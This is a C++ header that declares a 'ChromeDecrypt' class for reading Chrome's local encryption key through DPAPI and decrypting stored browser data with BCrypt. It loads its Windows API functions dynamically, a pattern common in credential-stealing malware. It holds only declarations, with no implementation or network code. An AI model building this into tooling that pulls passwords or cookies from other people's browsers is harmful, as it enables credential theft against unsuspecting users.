#pragma once

#include "cJson.h"
#include <string>
#include <vector>
#include <Windows.h>
#include <shlobj_core.h>
#include <bcrypt.h>
#include <shellapi.h>
#include <dpapi.h>
#include "WinApiImport.h"

#define DPAPI_PREFIX_LEN 5
#define MAX_SIZE 1024

using f_BCryptDecrypt = decltype(BCryptDecrypt);
using f_SHGetFolderPathA = decltype(SHGetFolderPathA);
using f_SHFileOperation = decltype(SHFileOperation);
using f_CreateFileA = decltype(CreateFileA);
using f_GetFileSize = decltype(GetFileSize);
using f_ReadFile = decltype(ReadFile);
using f_CloseHandle = decltype(CloseHandle);


using f_CryptUnprotectData = decltype(CryptUnprotectData);
using f_BCryptOpenAlgorithmProvider = decltype(BCryptOpenAlgorithmProvider);
using f_BCryptSetProperty = decltype(BCryptSetProperty);
using f_BCryptGenerateSymmetricKey = decltype(BCryptGenerateSymmetricKey);

using f_FindFirstFile = decltype(FindFirstFile);
using f_FindClose = decltype(FindClose);

class ChromeDecrypt
{
public:
	ChromeDecrypt();
	~ChromeDecrypt();
	bool initDecryptor(const std::string& path);
	bool decrypt(const std::string& encrypted, std::string& decrypted, int size);
	std::string getAppFolder(int CSIDL_FLAG);

private:
	//decrypt functions + paramaters
	BCRYPT_ALG_HANDLE m_algHandler;
	BCRYPT_KEY_HANDLE m_keyHandler;
	char* m_tempSaver;


	std::function<f_BCryptDecrypt>                  m_BCryptDecrypt;
	std::function<f_CryptUnprotectData>             m_CryptUnprotectData;
	std::function<f_BCryptOpenAlgorithmProvider>    m_BCryptOpenAlgorithmProvider;
	std::function<f_BCryptSetProperty>              m_BCryptSetProperty;
	std::function<f_BCryptGenerateSymmetricKey>     m_BCryptGenerateSymmetricKey;

	bool getChromeKey(std::string& key, unsigned long& size, const std::string& path);
	bool decryptKey(std::string key, DWORD size, char* decKey);
	bool decryptDPAPI(unsigned char* encData, unsigned long size, char* decData);
	bool initHandlers(PBYTE key, ULONG size);
	cJSON* findNode(cJSON* node, const char* key);
	bool isFileExists(const std::string& file);
	bool readFile(const std::string& path, std::string& data);
};